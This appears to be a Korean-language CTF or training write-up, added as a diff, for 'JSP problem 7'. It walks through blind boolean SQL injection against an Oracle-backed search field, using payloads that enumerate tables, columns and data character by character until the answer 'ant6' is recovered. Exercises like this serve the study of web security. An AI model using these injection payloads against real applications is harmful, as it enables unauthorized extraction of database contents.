@@ -1,0 +1,101 @@
+JSP 문제 7번
+
+테이블 수
+테이블 이름길이
+테이블명
+
+테이블의 칼럼 수
+컬럼 이름길이
+answer 테이블의 컬럼명
+
+1칼럼의 데이터명
+
+--쿼리 예측--
+
+SELECT * FROM emp WHERE ename LIKE '%입력값%'
+
+검색어 puppy%' and (공격쿼리) and '1%' = '1
+
+--참 거짓--
+
+puppy%' and '1%' = '1
+
+
+--테이블 개수 찾기--
+select table_name from user_tables
+
+1-1) 테이블의 개수: 6
+
+(select count(table_name) from user_tables> 0)
+
+puppy%' and (select count(table_name) from user_tables) = 6 and '1%' = '1
+
+1-2) 각 테이블 이름 구하기
+
+1-3)
+첫번째 테이블의 첫번째 글자 구하기
+
+//틀린 답
+(select ascii(substr(table_name,1,1)), rownum ln from user_tables) where ln = 1
+
+
+(select ASCII(SUBSTR(table_name, 1, 1)) from (select table_name, rownum as ln from user_tables) where ln = 1)
+
+
+puppy%' AND (select ASCII(SUBSTR(table_name, 1, 1)) from (select table_name, rownum as ln from user_tables) where ln = 1) > 65 AND '1%'='1
+             ~~~~~~~1번째 글자 구하기~~~~~~~                      ~~~~~~~1번째 테이블~~~~~
+
+---정답 테이블: ANSWER // 6 번째
+
+puppy%' AND (select ASCII(SUBSTR(table_name, 2, 1)) from (select table_name, rownum as ln from user_tables) where ln = 6) > 65 AND '1%'='1
+
+
+1-4)
+ANSWER 테이블에 칼럼 개수 구하기 : 5 개 칼럼
+
+select count(column_name) from all_tab_columns where table_name = ANSWER
+
+puppy%' AND (select count(column_name) from all_tab_columns where table_name = 'ANSWER') > 0 AND '1%'='1
+
+puppy%' AND (select count(column_name) from all_tab_columns where table_name = 'ANSWER') = 5 AND '1%'='1
+                                                                                        ~~~5개~~~
+
+1-5)
+ANSWER 테이블에 5개 칼럼 중 정답 칼럼 구하기 -> 1번째 칼럼이 ANSWER
+
+select ASCII(SUBSTR(column_name, 1, 1)) from (select column_name, rownum as ln from all_tab_columns where table_name = 'ANSWER') where ln = 1
+                                                    ~~~~~~~ANSWER 테이블에서 ANSWER 칼럼 가져오기~~~~~
+
+puppy%' AND (select ASCII(SUBSTR(column_name, 1, 1)) from (select column_name, rownum as ln from all_tab_columns where table_name = 'ANSWER') where ln = 1) > 64 AND '1%'='1
+                                                                                                                                                        ~~~~~칼럼명 ANSWER~~~~
+
+1-6) 
+ANSWER 테이블의 ANSWER 칼럼의 데이터 개수 구하기 : 1 개
+
+
+select count(*) from (select column_name from all_tab_columns where table_name = 'ANSWER') 
+
+(select count(*) from (select ANSWER from ANSWER) ) > 0
+
+puppy%' AND (select count(*) from (select ANSWER from ANSWER) ) > 0 AND '1%'='1
+
+
+1-7)
+ANSWER 테이블의 ANSWER 칼럼의 데이터의 글자 수 구하기 : 4
+
+(select length(ANSWER) from ANSWER) > 0
+
+puppy%' AND (select length(ANSWER) from ANSWER) > 0  AND '1%'='1
+
+1-8)
+ANSWER 테이블의 ANSWER 칼럼의 데이터 구하기 : ant6
+
+(select ascii(substr(ANSWER,1,1)) from ANSWER) > 30 
+
+
+puppy%' AND (select ascii(substr(ANSWER,1,1)) from ANSWER) > 64 AND '1%'='1
+
+2. 정답
+
+ant6
+
